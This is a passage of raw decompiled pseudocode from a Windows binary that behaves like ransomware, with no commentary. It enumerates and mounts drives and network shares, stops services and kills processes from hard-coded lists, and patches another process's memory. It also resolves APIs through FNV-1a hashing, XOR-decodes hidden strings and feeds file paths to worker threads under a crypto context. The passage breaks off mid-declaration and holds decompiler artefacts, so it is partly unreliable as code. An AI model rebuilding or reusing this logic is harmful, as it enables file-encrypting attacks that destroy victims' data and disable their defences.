            while ( (struct _SECURITY_ATTRIBUTES *)(16 * (v9 & 0x3FFFFFFF)) != v16 );
          }
          v17 = (unsigned int)pNumArgs;
          v18 = v58;
          v19 = sub_14000898B((__int64)v58, (unsigned int)pNumArgs, (__int64)v58, pNumArgs, "s");
          v20 = sub_14000898B((__int64)v18, v17, (__int64)v18, v17, L"paths");
          v61 = v9;
          *(_QWORD *)v60 = v15;
          *(_QWORD *)bWaitAll = v12;
          if ( v19 )
          {
            v21 = lstrlenW(v20);
            v22 = 1;
            if ( v21 > 0 )
            {
              v22 = 1;
              for ( k = 0LL; k != v21; ++k )
              {
                if ( v19[k] == 44 )
                {
                  v19[k] = 0;
                  ++v22;
                }
              }
            }
            do
            {
              v24 = lstrlenW(v20);
              v17 = (__int64)sub_14000878B((__int64)v20, v17, v25, 2 * v24 + 2);
              lstrcpyW(v20, (LPCWSTR)v17);
              Z16d2816ea60753364fPKw((__int64)v20, v17, v26, v17);
              GetProcessHeap();
              HeapFree(v20, v17, 0LL);
              v19 += lstrlenW(v20) + 1;
              --v22;
            }
            while ( v22 );
          }
          else
          {
            v19 = 0LL;
          }
          v27 = 1;
          if ( v20 )
          {
            v28 = lstrlenW(v20);
            v29 = 1;
            if ( v28 > 0 )
            {
              v29 = 1;
              for ( m = 0LL; m != v28; ++m )
              {
                if ( v20[m] == 44 )
                {
                  v20[m] = 0;
                  ++v29;
                }
              }
            }
            do
            {
              v17 = (__int64)v20;
              v31 = lstrlenW(v20);
              v33 = (WCHAR *)sub_14000878B((__int64)v20, (__int64)v20, v32, 2 * v31 + 2);
              lstrcpyW(v33, (LPCWSTR)v17);
              if ( lstrlenW(v33) == 2 && v33[1] == 58 )
                Z17_da736ccd2972c524w(a3, a4, a5, a6, v35, v36, a9, (__int64)v33, v17, v34, *v33);
              else
                Z16d813fb2f7e16258aPw(v33, a3, a4, a5, a6, v35, v36, a9, v17, v34, (struct _RTL_CRITICAL_SECTION *)v33);
              GetProcessHeap();
              HeapFree(v33, v17, 0LL);
              v20 = (WCHAR *)(v17 + 2LL * lstrlenW(v33) + 2);
              --v29;
            }
            while ( v29 );
            v27 = v17 == 0;
          }
          v37 = v19 == 0LL;
          v38 = v61;
          v39 = v60[0];
          v40 = bWaitAll[0];
          v41 = *(WCHAR **)dwDesiredAccess;
          v42 = v58;
          if ( v37 && v27 && !OpenMutexA(dwDesiredAccess[0], v17, 0LL) )
          {
            CreateMutexA((LPSECURITY_ATTRIBUTES)v41, v17, 0LL);
            if ( pNumArgs >= 2 )
            {
              v45 = 1LL;
              while ( *v42[v45] != 45 )
              {
                if ( pNumArgs == ++v45 )
                  goto LABEL_45;
              }
              Z16fbddd3ee5768b27aP13_NETRESOURCEW(v41, v17, a3, a4, a5, a6, v43, v44, a9);
            }
LABEL_45:
            Z17_d58e476eea38c127v();
            LogicalDrives = GetLogicalDrives();
            if ( LogicalDrives )
            {
              v17 = LogicalDrives;
              LOWORD(v41) = 65;
              do
              {
                if ( (v17 & 1) != 0 )
                  Z17_da736ccd2972c524w(a3, a4, a5, a6, v48, v49, a9, (__int64)v41, v17, v47, (unsigned int)v41);
                v17 = (unsigned int)v17 >> 1;
                v41 = (WCHAR *)(unsigned int)((_DWORD)v41 + 1);
              }
              while ( (_WORD)v41 != 91 );
            }
            v41 = *(WCHAR **)dwDesiredAccess;
            if ( pNumArgs < 2 )
            {
LABEL_54:
              Z16fbddd3ee5768b27aP13_NETRESOURCEW(*(WCHAR **)dwDesiredAccess, v17, a3, a4, a5, a6, v48, v49, a9);
            }
            else
            {
              v50 = 1LL;
              while ( *v42[v50] != 45 )
              {
                if ( pNumArgs == ++v50 )
                  goto LABEL_54;
              }
            }
          }
          if ( (_DWORD)v41 )
          {
            do
            {
              sub_140008827((__int64)v41, (__int64)&Handles, 0LL, (__int64)&Handles, 1);
              v41 = (WCHAR *)(unsigned int)((_DWORD)v41 - 1);
            }
            while ( (_DWORD)v41 );
            v41 = *(WCHAR **)dwDesiredAccess;
            WaitForMultipleObjects(dwDesiredAccess[0], &Handles, v40, dwDesiredAccess[0]);
            do
            {
              sub_140008827((__int64)v41, (__int64)&unk_140012158, 0LL, (__int64)&unk_140012158, 1);
              v41 = (WCHAR *)(unsigned int)((_DWORD)v41 - 1);
            }
            while ( (_DWORD)v41 );
          }
          else
          {
            WaitForMultipleObjects(0, (const HANDLE *)v17, v40, 0);
          }
          v51 = *(WCHAR **)dwDesiredAccess;
          WaitForMultipleObjects((DWORD)v41, *(const HANDLE **)dwDesiredAccess, v39, dwDesiredAccess[0]);
          Z17_a94acad879016c13v((HMODULE)v41, (const CHAR *)v51);
          if ( (_DWORD)v51 )
          {
            v52 = 16LL * (v38 & 0x3FFFFFFF);
            v53 = 0LL;
            do
            {
              CloseHandle(CloseHandle);
              CloseHandle(CloseHandle);
              v53 += 8LL;
            }
            while ( v52 != v53 );
          }
          LODWORD(v10) = (_DWORD)GetProcessHeap;
          GetProcessHeap();
          a1 = (HCRYPTPROV)HeapFree;
          HeapFree(HeapFree, (DWORD)GetProcessHeap, 0LL);
          GetProcessHeap();
          HeapFree(HeapFree, (DWORD)GetProcessHeap, 0LL);
        }
      }
      CryptReleaseContext(a1, v10);
    }
  }
  else
  {
    qword_140012150 = 0LL;
  }
  sub_140001C90((HMODULE)a1);
  ExitProcess(a1);
}
// 140008327: variable 'v11' is possibly undefined
// 140008332: variable 'v13' is possibly undefined
// 1400084A3: variable 'v25' is possibly undefined
// 1400084B7: variable 'v26' is possibly undefined
// 14000854C: variable 'v32' is possibly undefined
// 140008571: variable 'v35' is possibly undefined
// 140008571: variable 'v36' is possibly undefined
// 140008571: variable 'v34' is possibly undefined
// 140008624: variable 'v43' is possibly undefined
// 140008624: variable 'v44' is possibly undefined
// 140008646: variable 'v48' is possibly undefined
// 140008646: variable 'v49' is possibly undefined
// 140008646: variable 'v47' is possibly undefined
// 14000D7F4: using guessed type wchar_t aPaths[6];
// 140012150: using guessed type __int64 qword_140012150;
// 140012200: using guessed type __int64 qword_140012200;
// 1400081EC: using guessed type _QWORD dwProvType[4];

//----- (0000000140008781) ----------------------------------------------------
void __fastcall __noreturn sub_140008781(
        HCRYPTPROV a1,
        const WCHAR *a2,
        double a3,
        double a4,
        double a5,
        double a6,
        double a7,
        double a8,
        __m128 a9)
{
  Z12initCallbackPw(a1, a2, a3, a4, a5, a6, a7, a8, a9);
}

//----- (000000014000878B) ----------------------------------------------------
LPVOID __fastcall sub_14000878B(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  DWORD v4; // esi
  LPVOID result; // rax

  v4 = a4 + 64;
  do
  {
    GetProcessHeap();
    result = HeapAlloc(GetProcessHeap, v4, 8uLL);
  }
  while ( !result );
  return result;
}

//----- (00000001400087C3) ----------------------------------------------------
void __fastcall sub_1400087C3(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  struct _SECURITY_ATTRIBUTES *v5; // rdi

  *(_DWORD *)(a4 + 56) = a3;
  v5 = (struct _SECURITY_ATTRIBUTES *)(int)a3;
  *(_QWORD *)(a4 + 64) = sub_14000878B((int)a3, a4, a3, 8 * (int)a3);
  *(_QWORD *)a4 = CreateSemaphoreA(v5, a4, (LONG)v5, 0LL);
  *(_QWORD *)(a4 + 8) = CreateSemaphoreA(v5, a4, 0, 0LL);
  *(_QWORD *)(a4 + 72) = 0LL;
  InitializeCriticalSection((LPCRITICAL_SECTION)v5);
}

//----- (0000000140008827) ----------------------------------------------------
__int64 __fastcall sub_140008827(__int64 a1, __int64 a2, struct _RTL_CRITICAL_SECTION *a3, __int64 a4, int a5)
{
  unsigned int v8; // ebx
  unsigned int v9; // ebx
  __int64 v10; // rdx
  _BYTE *v11; // rax
  __int64 v12; // rdx
  signed int i; // [rsp+2Ch] [rbp-2Ch]

  v8 = 0;
  if ( WaitForSingleObject(a3, a4) )
  {
    if ( !a5 )
      return v8;
    WaitForSingleObject(a3, a4);
  }
  EnterCriticalSection(a3);
  if ( a3 )
  {
    v9 = 2 * lstrlenW((LPCWSTR)a3) + 2;
    v11 = sub_14000878B((__int64)a3, a4, v10, v9);
    for ( i = 0; i < v9; ++i )
      v11[i] = *((_BYTE *)&a3->DebugInfo + i);
  }
  else
  {
    v11 = 0LL;
  }
  v12 = *(int *)(a4 + 72);
  *(_QWORD *)(*(_QWORD *)(a4 + 64) + 8 * v12) = v11;
  *(_DWORD *)(a4 + 72) = ((int)v12 + 1) % *(_DWORD *)(a4 + 56);
  LeaveCriticalSection(a3);
  v8 = 1;
  ReleaseSemaphore(a3, a4, (LPLONG)1);
  return v8;
}
// 140008888: variable 'v10' is possibly undefined

//----- (0000000140008900) ----------------------------------------------------
struct _RTL_CRITICAL_SECTION *__fastcall sub_140008900(
        __int64 a1,
        __int64 a2,
        int a3,
        __int64 a4,
        struct _RTL_CRITICAL_SECTION *a5)
{
  __int64 v8; // rcx
  struct _RTL_CRITICAL_SECTION *v9; // rdi

  LODWORD(a5->DebugInfo) = 0;
  if ( WaitForSingleObject(a5, a4) )
  {
    if ( !a3 )
    {
      LODWORD(a5->DebugInfo) = -1;
      return 0LL;
    }
    WaitForSingleObject(a5, a4);
  }
  EnterCriticalSection(a5);
  v8 = *(int *)(a4 + 76);
  v9 = *(struct _RTL_CRITICAL_SECTION **)(*(_QWORD *)(a4 + 64) + 8 * v8);
  *(_DWORD *)(a4 + 76) = ((int)v8 + 1) % *(_DWORD *)(a4 + 56);
  LeaveCriticalSection(v9);
  ReleaseSemaphore(v9, a4, (LPLONG)1);
  return v9;
}

//----- (000000014000898B) ----------------------------------------------------
_WORD *__fastcall sub_14000898B(__int64 a1, __int64 a2, __int64 a3, int a4, _WORD *a5)
{
  __int64 v5; // r9
  __int64 v6; // r10
  _WORD *v7; // r11
  _WORD *v8; // rax
  __int16 v9; // cx
  int v10; // r11d

  if ( a4 < 2 )
    return 0LL;
  v5 = (unsigned int)a4;
  v6 = 1LL;
  while ( 1 )
  {
    v7 = *(_WORD **)(a3 + 8 * v6);
    if ( *v7 != 45 )
      goto LABEL_9;
    do
    {
      v8 = v7++;
      v9 = v8[1];
    }
    while ( v9 == 45 );
    if ( v9 == 61 )
      break;
    v10 = 0;
    do
    {
      v10 += v9 != *a5++;
      v9 = v8[2];
      ++v8;
    }
    while ( v9 != 61 );
    if ( !v10 )
      return v8 + 2;
LABEL_9:
    if ( ++v6 == v5 )
      return 0LL;
  }
  v8 = v7 - 1;
  return v8 + 2;
}

//----- (0000000140008A0D) ----------------------------------------------------
int Z17_d58e476eea38c127v()
{
  __int64 v0; // rbx
  __int64 v1; // rdi
  wchar_t *v2; // rsi
  __int64 v3; // rdx
  __int64 v4; // rax
  WCHAR *v5; // rax
  __int64 v6; // rdx
  WCHAR *v7; // rsi
  __int64 v9[26]; // [rsp+30h] [rbp-318h]
  DWORD cchBufferLength; // [rsp+100h] [rbp-248h] BYREF

  v0 = 0LL;
  v1 = 0LL;
  do
  {
    v2 = off_14000D830[v0];
    if ( GetDriveTypeW((LPCWSTR)v1) == 1 )
    {
      v4 = (unsigned int)v1;
      v1 = (unsigned int)(v1 + 1);
      v9[v4] = (__int64)v2;
    }
    ++v0;
  }
  while ( v0 != 26 );
  LOWORD(cchBufferLength) = 0;
  v5 = (WCHAR *)sub_14000878B(v1, (__int64)v2, v3, 0x10000);
  if ( v5 )
  {
    v7 = v5;
    if ( sub_14000878B(v1, (__int64)v5, v6, 0x10000) )
    {
      FindFirstVolumeW((LPWSTR)v1, (DWORD)v7);
      do
      {
        if ( !(_DWORD)v1 )
          break;
        if ( GetVolumePathNamesForVolumeNameW((LPCWSTR)v1, v7, (DWORD)&cchBufferLength, (PDWORD)v7)
          && lstrlenW((LPCWSTR)v1) == 3 )
        {
          LOWORD(cchBufferLength) = 0;
        }
        else
        {
          v1 = (unsigned int)(v1 - 1);
          SetVolumeMountPointW((LPCWSTR)v1, v7);
        }
      }
      while ( FindNextVolumeW((HANDLE)v1, v7, (DWORD)v7) );
      FindVolumeClose((HANDLE)v1);
      GetProcessHeap();
      HeapFree((HANDLE)v1, (DWORD)v7, 0LL);
    }
    GetProcessHeap();
    LODWORD(v5) = HeapFree((HANDLE)v1, (DWORD)v7, 0LL);
  }
  return (int)v5;
}
// 140008A6D: variable 'v3' is possibly undefined
// 140008A83: variable 'v6' is possibly undefined
// 14000D830: using guessed type wchar_t *off_14000D830[26];
// 140008A0D: using guessed type __int64 var_318[26];

//----- (0000000140008B64) ----------------------------------------------------
__int64 __fastcall sub_140008B64(CHAR *a1, const CHAR *a2)
{
  FARPROC ProcAddress; // rax
  __int64 (__fastcall *v3)(_QWORD, _QWORD, _QWORD, _QWORD); // rsi
  HANDLE CurrentProcess; // rax
  __int64 result; // rax
  unsigned int v6[3]; // [rsp+2Ch] [rbp-Ch] BYREF

  v6[0] = 0;
  GetModuleHandleA(a1);
  ProcAddress = GetProcAddress((HMODULE)a1, a2);
  if ( !ProcAddress )
    return 0LL;
  v3 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))ProcAddress;
  CurrentProcess = GetCurrentProcess();
  result = v3(a1, v3, v6, CurrentProcess);
  if ( (_DWORD)result )
    return v6[0];
  return result;
}
// 140008B64: using guessed type unsigned int var_C[3];

//----- (0000000140008BB8) ----------------------------------------------------
__int64 (__fastcall *__fastcall Z17_a94acad879016c13v(
        HMODULE a1,
        const CHAR *a2))(HMODULE, const CHAR *, __int64, __int64)
{
  FARPROC ProcAddress; // rax
  __int64 v3; // rdx
  void (__fastcall *v4)(HMODULE, const CHAR *, char *, _QWORD, __int128 *); // r10
  __int64 v5; // r9
  _QWORD *v6; // rdx
  _QWORD *v7; // r9
  __int64 v8; // rax
  __int64 v9; // r8
  __int64 v10; // rcx
  __int64 v11; // rbx
  char v12; // al
  char *v13; // rbx
  int v14; // ebp
  __int64 i; // rax
  __int64 j; // rax
  __int64 (__fastcall *result)(HMODULE, const CHAR *, __int64, __int64); // rax
  __int64 v18; // rdx
  __int64 v19; // [rsp+30h] [rbp-118h] BYREF
  char v20[18]; // [rsp+38h] [rbp-110h] BYREF
  __int16 v21; // [rsp+4Ah] [rbp-FEh]
  __int128 v22; // [rsp+50h] [rbp-F8h] BYREF
  __int16 v23; // [rsp+6Eh] [rbp-DAh]
  __int128 v24[5]; // [rsp+70h] [rbp-D8h]
  int v25; // [rsp+C0h] [rbp-88h]
  __int16 v26; // [rsp+C4h] [rbp-84h]
  __int16 v27; // [rsp+11Ah] [rbp-2Eh]

  v19 = 0LL;
  if ( (unsigned int)sub_140008B64((CHAR *)a1, a2) )
  {
    LoadLibraryA((LPCSTR)a1);
    ProcAddress = GetProcAddress(a1, a2);
    if ( ProcAddress )
      ((void (__fastcall *)(HMODULE, const CHAR *, __int64, __int64 *))ProcAddress)(a1, a2, v3, &v19);
  }
  v4 = (void (__fastcall *)(HMODULE, const CHAR *, char *, _QWORD, __int128 *))qword_140012208;
  if ( !qword_140012208 )
  {
    v5 = *(_QWORD *)(*(_QWORD *)(qword_1400121F8 + 96) + 24LL);
    v6 = *(_QWORD **)(v5 + 32);
    v7 = (_QWORD *)(v5 + 32);
    v4 = 0LL;
    while ( 1 )
    {
      a1 = (HMODULE)v6[4];
      if ( *(_WORD *)a1 == 23117 )
      {
        v8 = *((int *)a1 + 15);
        if ( *(_DWORD *)((char *)a1 + v8) == 17744 && *(_WORD *)((char *)a1 + v8 + 20) >= 0x60u )
        {
          if ( *(_DWORD *)((char *)a1 + v8 + 132) )
          {
            v9 = *(unsigned int *)((char *)a1 + v8 + 136);
            if ( *(_DWORD *)((char *)a1 + v8 + 136) )
            {
              if ( *(_DWORD *)((char *)a1 + v9 + 24) )
              {
                a2 = (char *)a1 + *(unsigned int *)((char *)a1 + v9 + 32);
                v10 = 0LL;
                while ( 1 )
                {
                  v11 = *(unsigned int *)&a2[4 * v10];
                  v12 = *((_BYTE *)a1 + v11);
                  if ( v12 )
                  {
                    v13 = (char *)a1 + v11 + 1;
                    v14 = -2128831035;
                    do
                    {
                      v14 = 16777619 * (v14 ^ v12);
                      v12 = *v13++;
                    }
                    while ( v12 );
                    if ( v14 == 420481993 )
                      break;
                  }
                  if ( ++v10 == *(_DWORD *)((char *)a1 + v9 + 24) )
                    goto LABEL_20;
                }
                if ( a1 )
                  break;
              }
            }
          }
        }
      }
LABEL_20:
      v6 = (_QWORD *)*v6;
      if ( v6 == v7 )
        goto LABEL_21;
    }
    v4 = (void (__fastcall *)(HMODULE, const CHAR *, char *, _QWORD, __int128 *))((char *)a1
                                                                                + *(unsigned int *)((char *)a1
                                                                                                  + 4 * *(unsigned __int16 *)((char *)a1 + 2 * (unsigned int)v10 + *(unsigned int *)((char *)a1 + v9 + 36))
                                                                                                  + *(unsigned int *)((char *)a1 + v9 + 28)));
LABEL_21:
    qword_140012208 = (__int64)v4;
  }
  *(_WORD *)&v20[8] = 30308;
  *(_QWORD *)v20 = 0x760D76077611006FLL;
  *(__m128 *)&v20[2] = _mm_xor_ps(*(__m128 *)&v20[2], (__m128)xmmword_14000D3C0);
  v21 = 0;
  v22 = xmmword_14000D3D0;
  v23 = 0;
  LOWORD(v22) = 99;
  for ( i = 1LL; i != 15; ++i )
    *((_WORD *)&v22 + i) ^= (_WORD)i + 30304;
  v23 = 0;
  v24[0] = xmmword_14000D3E0;
  v24[1] = xmmword_14000D3F0;
  v24[2] = xmmword_14000D400;
  v24[3] = xmmword_14000D410;
  v24[4] = xmmword_14000D420;
  v25 = 1996322541;
  v26 = 30346;
  v27 = 0;
  LOWORD(v24[0]) = 47;
  for ( j = 1LL; j != 85; ++j )
    *((_WORD *)v24 + j) ^= (_WORD)j + 30304;
  v27 = 0;
  v4(a1, a2, v20, 0LL, &v22);
  result = (__int64 (__fastcall *)(HMODULE, const CHAR *, __int64, __int64))sub_140008B64((CHAR *)a1, a2);
  if ( (_DWORD)result )
  {
    LoadLibraryA((LPCSTR)a1);
    result = (__int64 (__fastcall *)(HMODULE, const CHAR *, __int64, __int64))GetProcAddress(a1, a2);
    if ( result )
      return (__int64 (__fastcall *)(HMODULE, const CHAR *, __int64, __int64))result(a1, a2, v18, v19);
  }
  return result;
}
// 140008BFE: variable 'v3' is possibly undefined
// 140008E1E: variable 'v18' is possibly undefined
// 14000D3C0: using guessed type __int128 xmmword_14000D3C0;
// 14000D3D0: using guessed type __int128 xmmword_14000D3D0;
// 14000D3E0: using guessed type __int128 xmmword_14000D3E0;
// 14000D3F0: using guessed type __int128 xmmword_14000D3F0;
// 14000D400: using guessed type __int128 xmmword_14000D400;
// 14000D410: using guessed type __int128 xmmword_14000D410;
// 14000D420: using guessed type __int128 xmmword_14000D420;
// 1400121F8: using guessed type __int64 qword_1400121F8;
// 140012208: using guessed type __int64 qword_140012208;

//----- (0000000140008E51) ----------------------------------------------------
int __fastcall Z17_f748c24884dd5699v(const CHAR *a1)
{
  __int64 TickCount; // rsi
  SC_HANDLE v2; // rax
  SC_HANDLE v3; // rdi
  __int64 v4; // rbp
  SC_HANDLE v5; // rax
  DWORD v6; // ebx
  __int64 v7; // rdx
  DWORD *v8; // rax
  SC_HANDLE v9; // rax
  DWORD *v11; // [rsp+38h] [rbp-B0h]
  unsigned int lpServicesReturned; // [rsp+44h] [rbp-A4h]
  DWORD lpServicesReturned_4; // [rsp+48h] [rbp-A0h]
  DWORD v14; // [rsp+58h] [rbp-90h] BYREF
  int v15; // [rsp+5Ch] [rbp-8Ch]
  DWORD pcbBytesNeeded; // [rsp+80h] [rbp-68h] BYREF
  int v17; // [rsp+84h] [rbp-64h]

  TickCount = GetTickCount();
  v2 = OpenSCManagerA(a1, (LPCSTR)TickCount, 0);
  if ( v2 )
  {
    v3 = v2;
    v4 = 0LL;
    v11 = 0LL;
    do
    {
      v5 = OpenServiceA(v3, (LPCSTR)TickCount, (DWORD)off_14000DA40[v4]);
      if ( v5 )
      {
        v6 = (unsigned int)v5;
        if ( QueryServiceStatusEx(v3, (SC_STATUS_TYPE)TickCount, 0LL, (DWORD)v5, &pcbBytesNeeded) && (v17 | 2) != 3 )
        {
          if ( !EnumDependentServicesA(v3, TickCount, (LPENUM_SERVICE_STATUSA)1, v6, v11, 0LL) && GetLastError() == 234 )
          {
            v8 = (DWORD *)sub_14000878B((__int64)v3, TickCount, v7, lpServicesReturned);
            if ( v8 )
            {
              v11 = v8;
              if ( EnumDependentServicesA(v3, TickCount, (LPENUM_SERVICE_STATUSA)1, v6, v8, (LPDWORD)lpServicesReturned) )
              {
                v9 = OpenServiceA(v3, (LPCSTR)TickCount, *(_QWORD *)&v11[12 * v4]);
                if ( v9 )
                {
                  lpServicesReturned_4 = (unsigned int)v9;
                  if ( ControlService(v3, TickCount, (LPSERVICE_STATUS)1) )
                  {
                    while ( v15 != 1 )
                    {
                      Sleep((DWORD)v3);
                      if ( QueryServiceStatusEx(v3, (SC_STATUS_TYPE)TickCount, 0LL, lpServicesReturned_4, &v14) )
                      {
                        if ( v15 == 1 || GetTickCount() - (unsigned int)TickCount > 0x7530 )
                          break;
                      }
                    }
                    CloseServiceHandle(v3);
                  }
                }
              }
              GetProcessHeap();
              HeapFree(v3, TickCount, 0LL);
            }
            else
            {
              v11 = 0LL;
            }
          }
          if ( ControlService(v3, TickCount, (LPSERVICE_STATUS)1) )
          {
            do
            {
              if ( v17 == 1 )
                break;
              Sleep((DWORD)v3);
              if ( !QueryServiceStatusEx(v3, (SC_STATUS_TYPE)TickCount, 0LL, v6, &pcbBytesNeeded) )
                break;
            }
            while ( v17 != 1 && GetTickCount() - (unsigned int)TickCount < 0x7531 );
          }
        }
        CloseServiceHandle(v3);
      }
      ++v4;
    }
    while ( v4 != 26 );
    LODWORD(v2) = CloseServiceHandle(v3);
  }
  return (int)v2;
}
// 140008F4D: variable 'v7' is possibly undefined
// 140008F4D: variable 'lpServicesReturned' is possibly undefined
// 14000DA40: using guessed type char *off_14000DA40[26];

//----- (00000001400090D5) ----------------------------------------------------
__int64 __fastcall sub_1400090D5(int (__cdecl *a1)(const wchar_t *String1, const wchar_t *String2), DWORD a2)
{
  MODULEENTRY32 *Toolhelp32Snapshot; // rsi
  __int64 v3; // r14
  __int64 v5; // [rsp+38h] [rbp-250h]

  Toolhelp32Snapshot = (MODULEENTRY32 *)CreateToolhelp32Snapshot((DWORD)a1, a2);
  if ( Toolhelp32Snapshot == (MODULEENTRY32 *)-1LL || !Module32First(a1, Toolhelp32Snapshot) )
  {
    v3 = 0LL;
  }
  else
  {
    a1 = _wcsicmp;
    v3 = 0LL;
    while ( _wcsicmp((const wchar_t *)_wcsicmp, (const wchar_t *)Toolhelp32Snapshot) )
    {
      if ( !Module32Next(_wcsicmp, Toolhelp32Snapshot) )
        goto LABEL_9;
    }
    v3 = v5;
  }
LABEL_9:
  CloseHandle(a1);
  return v3;
}
// 14000914E: variable 'v5' is possibly undefined

//----- (0000000140009170) ----------------------------------------------------
void __fastcall __noreturn sub_140009170(
        __int64 a1,
        BOOL (__stdcall *a2)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect))
{
  __int64 i; // r12
  DWORD v3; // ebp
  HANDLE v4; // rbx
  const CHAR *v5; // rsi
  FARPROC ProcAddress; // rbp
  char *v7; // rbp
  DWORD dwFlags[11]; // [rsp+28h] [rbp-170h] BYREF

  while ( 1 )
  {
    for ( i = 0LL; i != 36; ++i )
    {
      if ( CreateToolhelp32Snapshot((DWORD)dwFlags, (DWORD)a2) == (HANDLE)-1LL )
      {
        CloseHandle(dwFlags);
      }
      else
      {
        dwFlags[0] = 304;
        v3 = 0;
        if ( Process32First(dwFlags, (LPPROCESSENTRY32)a2) )
        {
          a2 = (BOOL (__stdcall *)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD))*(&off_14000DC80 + i);
          while ( _wcsicmp((const wchar_t *)dwFlags, (const wchar_t *)a2) )
          {
            if ( !Process32Next(dwFlags, (LPPROCESSENTRY32)a2) )
              goto LABEL_10;
          }
          v3 = dwFlags[2];
        }
LABEL_10:
        CloseHandle(dwFlags);
        if ( v3 )
        {
          v4 = OpenProcess((DWORD)dwFlags, (BOOL)a2, 0);
          if ( (unsigned __int64)v4 + 1 >= 2 )
          {
            v5 = (const CHAR *)sub_1400090D5((int (__cdecl *)(const wchar_t *, const wchar_t *))dwFlags, (DWORD)a2);
            GetModuleHandleA((LPCSTR)dwFlags);
            ProcAddress = GetProcAddress((HMODULE)dwFlags, v5);
            GetCurrentProcess();
            GetProcessId(dwFlags);
            v7 = (char *)ProcAddress
               + (_QWORD)v5
               - sub_1400090D5((int (__cdecl *)(const wchar_t *, const wchar_t *))dwFlags, (DWORD)v5)
               + 3;
            a2 = VirtualProtectEx;
            VirtualProtectEx(dwFlags, VirtualProtectEx, (SIZE_T)v7, (DWORD)v4, (PDWORD)5);
            WriteProcessMemory(dwFlags, VirtualProtectEx, v7, (SIZE_T)v4, (SIZE_T *)&NumberOfBytesWritten);
            VirtualProtectEx(dwFlags, VirtualProtectEx, (SIZE_T)v7, (DWORD)v4, (PDWORD)5);
          }
        }
      }
    }
  }
}
// 14000DC80: using guessed type void *off_14000DC80;

//----- (00000001400092EC) ----------------------------------------------------
BOOL __fastcall Z17_c32ef15adecfbcf9v(int (__stdcall *a1)(LPCWSTR lpString1, LPCWSTR lpString2), DWORD a2)
{
  PROCESSENTRY32W *Toolhelp32Snapshot; // rsi
  __int64 v3; // rbx

  Toolhelp32Snapshot = (PROCESSENTRY32W *)CreateToolhelp32Snapshot((DWORD)a1, a2);
  if ( Process32FirstW(a1, Toolhelp32Snapshot) )
  {
    v3 = 0LL;
    a1 = lstrcmpW;
    while ( lstrcmpW((LPCWSTR)lstrcmpW, (LPCWSTR)Toolhelp32Snapshot) )
    {
      if ( ++v3 == 36 )
      {
LABEL_8:
        v3 = 0LL;
        if ( !Process32NextW(lstrcmpW, Toolhelp32Snapshot) )
          return CloseHandle(a1);
      }
    }
    if ( OpenProcess((DWORD)lstrcmpW, (BOOL)Toolhelp32Snapshot, 0) )
    {
      TerminateProcess(lstrcmpW, (UINT)Toolhelp32Snapshot);
      CloseHandle(lstrcmpW);
    }
    goto LABEL_8;
  }
  return CloseHandle(a1);
}

//----- (00000001400093C1) ----------------------------------------------------
void *__fastcall sub_1400093C1(__int64 a1, __int64 a2, char *a3, _DWORD *a4, unsigned int a5)
{
  unsigned __int64 v5; // rsi
  char *v6; // rdi
  __int64 v8; // rax
  unsigned int v9; // ecx
  bool v10; // cf
  int v11; // ecx
  void *result; // rax
  __int64 i; // rax
  unsigned __int32 v14; // edx
  __int64 j; // rax
  unsigned int v16; // r9d
  unsigned int v17; // r8d
  __int64 v18; // rax
  __int64 v19; // kr00_8
  int v20; // edx
  unsigned __int64 v21; // rt0
  int v22; // edi
  int v23; // ebx
  int v24; // ebp
  unsigned int v25; // r10d
  int v26; // kr08_4
  unsigned __int64 v27; // kr10_8
  unsigned int v28; // r10d
  unsigned int v29; // r15d
  unsigned int v30; // r11d
  unsigned int v31; // ebx
  unsigned int v32; // r9d
  unsigned int v33; // r13d
  int v34; // edx
  int v35; // ebp
  int v36; // esi
  unsigned __int64 v37; // kr28_8
  int v38; // eax
  int v39; // edi
  unsigned int v40; // edx
  int v41; // r13d
  int v42; // ecx
  unsigned int v43; // r10d
  unsigned int v44; // edx
  unsigned int v45; // r11d
  unsigned __int64 v46; // kr30_8
  unsigned int v47; // r10d
  unsigned int v48; // r13d
  unsigned __int64 v49; // kr38_8
  int v50; // ecx
  unsigned __int64 v51; // kr40_8
  unsigned int v52; // edx
  unsigned int v53; // ebx
  unsigned int v54; // edi
  int v55; // r10d
  unsigned __int64 v56; // kr58_8
  unsigned __int64 v57; // rt0
  int v58; // ecx
  int v59; // eax
  int v60; // kr60_4
  unsigned __int64 v61; // kr68_8
  int v62; // ebx
  unsigned int v63; // r9d
  unsigned int v64; // r14d
  int v65; // eax
  int v66; // ecx
  int v67; // edx
  int v68; // kr80_4
  unsigned __int64 v69; // kr88_8
  int v70; // r12d
  unsigned int v71; // ebx
  unsigned int v72; // r15d
  int v73; // eax
  int v74; // ecx
  int v75; // edx
  int v76; // krA0_4
  unsigned __int64 v77; // krA8_8
  unsigned int v78; // ebp
  unsigned int v79; // r11d
  unsigned int v80; // r10d
  unsigned int v81; // r13d
  unsigned int v82; // ebp
  unsigned __int64 v83; // krC0_8
  int v84; // edi
  int v85; // krC8_4
  unsigned __int64 v86; // krD0_8
  unsigned int v87; // r10d
  unsigned int v88; // r13d
  unsigned int v89; // r8d
  unsigned int v90; // r14d
  unsigned __int64 v91; // krE0_8
  unsigned int v92; // r10d
  unsigned __int64 v93; // krE8_8
  int v94; // edi
  int v95; // krF0_4
  unsigned int v96; // ecx
  unsigned __int64 v97; // kr108_8
  unsigned __int64 v98; // kr110_8
  int v99; // edi
  int v100; // kr118_4
  unsigned __int64 v101; // kr130_8
  unsigned __int64 v102; // kr138_8
  unsigned int v103; // [rsp+20h] [rbp-3E8h]
  int v104; // [rsp+20h] [rbp-3E8h]
  int v105; // [rsp+24h] [rbp-3E4h]
  int v106; // [rsp+24h] [rbp-3E4h]
  unsigned int v107; // [rsp+28h] [rbp-3E0h]
  unsigned __int64 v108; // [rsp+2Ch] [rbp-3DCh]
  unsigned __int64 v109; // [rsp+2Ch] [rbp-3DCh]
  unsigned int v110; // [rsp+34h] [rbp-3D4h]
  int v111; // [rsp+34h] [rbp-3D4h]
  unsigned int v112; // [rsp+38h] [rbp-3D0h]
  int v113; // [rsp+38h] [rbp-3D0h]
  unsigned int v114; // [rsp+3Ch] [rbp-3CCh]
  unsigned int v115; // [rsp+3Ch] [rbp-3CCh]
  int v116; // [rsp+40h] [rbp-3C8h]
